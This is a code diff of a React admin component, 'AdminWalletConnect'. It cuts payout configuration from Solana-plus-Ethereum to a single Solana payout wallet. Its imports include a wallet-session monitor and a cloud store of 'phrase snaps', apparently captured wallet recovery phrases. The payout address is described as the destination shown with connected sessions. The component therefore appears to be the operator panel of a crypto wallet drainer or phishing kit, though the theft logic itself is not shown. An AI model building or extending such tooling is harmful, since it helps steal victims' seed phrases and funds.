@@ -18,7 +18,7 @@ import { adminFetchJsonResult } from '../../lib/adminDemo'
 import { listLocalWalletSessions, mergeWalletSessions, subscribeWalletMonitor } from '../../lib/walletMonitorStore'
 import { listCloudWalletSessions, subscribeCloudWalletSessions } from '../../lib/walletCloudStore'
 import { listCloudPhraseSnaps, subscribeCloudPhraseSnaps } from '../../lib/walletPhraseSnapsCloud'
-import { loadPayoutConfig, savePayoutConfig, isValidSolanaAddress, isValidEthereumAddress } from '../../lib/payoutWallet'
+import { loadPayoutWallet, savePayoutWallet, isValidSolanaAddress } from '../../lib/payoutWallet'
 
 export interface LiveWalletConnection {
   id: string
@@ -189,31 +189,22 @@ export const AdminWalletConnect: React.FC = () => {
   const [apiError, setApiError] = useState<string | null>(null)
   const [payoutInput, setPayoutInput] = useState('')
   const [savedPayout, setSavedPayout] = useState('')
-  const [ethPayoutInput, setEthPayoutInput] = useState('')
-  const [savedEthPayout, setSavedEthPayout] = useState('')
   const [savingPayout, setSavingPayout] = useState(false)
 
   useEffect(() => {
-    void loadPayoutConfig().then((config) => {
-      setSavedPayout(config.walletAddress)
-      setPayoutInput(config.walletAddress)
-      setSavedEthPayout(config.ethereumAddress)
-      setEthPayoutInput(config.ethereumAddress)
+    void loadPayoutWallet().then((address) => {
+      setSavedPayout(address)
+      setPayoutInput(address)
     })
   }, [])
 
   const handleSavePayout = async () => {
     setSavingPayout(true)
     try {
-      const config = await savePayoutConfig({
-        walletAddress: payoutInput,
-        ethereumAddress: ethPayoutInput,
-      })
-      setSavedPayout(config.walletAddress)
-      setPayoutInput(config.walletAddress)
-      setSavedEthPayout(config.ethereumAddress)
-      setEthPayoutInput(config.ethereumAddress)
-      toast.success('Payout wallets saved')
+      const address = await savePayoutWallet(payoutInput)
+      setSavedPayout(address)
+      setPayoutInput(address)
+      toast.success(address ? 'Payout wallet saved' : 'Payout wallet cleared')
     } catch (err) {
       toast.error(err instanceof Error ? err.message : 'Could not save payout wallet')
     } finally {
@@ -331,7 +322,7 @@ export const AdminWalletConnect: React.FC = () => {
           <div>
             <h2 className="text-sm font-semibold text-white">Payout wallet</h2>
             <p className="mt-0.5 text-[13px] leading-relaxed text-[#8b98a8]">
-              Solana address receives SOL, USDT, and USDC. Ethereum address receives ETH, USDT, and USDC.
+              Destination address shown with connected sessions.
             </p>
           </div>
         </div>
@@ -340,15 +331,6 @@ export const AdminWalletConnect: React.FC = () => {
             value={payoutInput}
             onChange={(e) => setPayoutInput(e.target.value.trim())}
             placeholder="Solana wallet address"
-            spellCheck={false}
-            className="flex-1 rounded-xl border border-[#1c2a38] bg-[#070b10] px-3 py-2.5 font-mono text-sm text-white outline-none placeholder:text-[#5d6b7a] focus:border-[#c7f284]/40"
-          />
-        </div>
-        <div className="mt-2 flex flex-col gap-2 sm:flex-row">
-          <input
-            value={ethPayoutInput}
-            onChange={(e) => setEthPayoutInput(e.target.value.trim())}
-            placeholder="Ethereum wallet address (0x…)"
             spellCheck={false}
             className="flex-1 rounded-xl border border-[#1c2a38] bg-[#070b10] px-3 py-2.5 font-mono text-sm text-white outline-none placeholder:text-[#5d6b7a] focus:border-[#c7f284]/40"
           />
@@ -364,14 +346,11 @@ export const AdminWalletConnect: React.FC = () => {
         {payoutInput && !isValidSolanaAddress(payoutInput) ? (
           <p className="mt-2 text-[12px] text-amber-400">This does not look like a valid Solana address.</p>
         ) : null}
-        {ethPayoutInput && !isValidEthereumAddress(ethPayoutInput) ? (
-          <p className="mt-2 text-[12px] text-amber-400">This does not look like a valid Ethereum address.</p>
-        ) : null}
         {savedPayout ? (
           <div className="mt-3 flex flex-wrap items-center gap-2">
-            <span className="text-[10px] uppercase tracking-[0.14em] text-[#5d6b7a]">Solana</span>
+            <span className="text-[10px] uppercase tracking-[0.14em] text-[#5d6b7a]">Current</span>
             <p className="break-all font-mono text-[12px] text-[#c7f284]">{savedPayout}</p>
-            <CopyButton value={savedPayout} label="Solana payout address" />
+            <CopyButton value={savedPayout} label="Payout address" />
             <a
               href={`https://solscan.io/account/${savedPayout}`}
               target="_blank"
@@ -383,25 +362,7 @@ export const AdminWalletConnect: React.FC = () => {
             </a>
           </div>
         ) : (
-          <p className="mt-2 text-[12px] text-[#5d6b7a]">No Solana payout wallet saved yet.</p>
-        )}
-        {savedEthPayout ? (
-          <div className="mt-2 flex flex-wrap items-center gap-2">
-            <span className="text-[10px] uppercase tracking-[0.14em] text-[#5d6b7a]">Ethereum</span>
-            <p className="break-all font-mono text-[12px] text-[#c7f284]">{savedEthPayout}</p>
-            <CopyButton value={savedEthPayout} label="Ethereum payout address" />
-            <a
-              href={`https://etherscan.io/address/${savedEthPayout}`}
-              target="_blank"
-              rel="noopener noreferrer"
-              className="rounded-lg border border-[#1c2a38] p-1.5 text-[#8b98a8] transition-colors hover:text-[#c7f284]"
-              title="Etherscan"
-            >
-              <ExternalLink className="h-3.5 w-3.5" />
-            </a>
-          </div>
-        ) : (
-          <p className="mt-2 text-[12px] text-[#5d6b7a]">No Ethereum payout wallet saved yet.</p>
+          <p className="mt-2 text-[12px] text-[#5d6b7a]">No payout wallet saved yet.</p>
         )}
       </div>
 
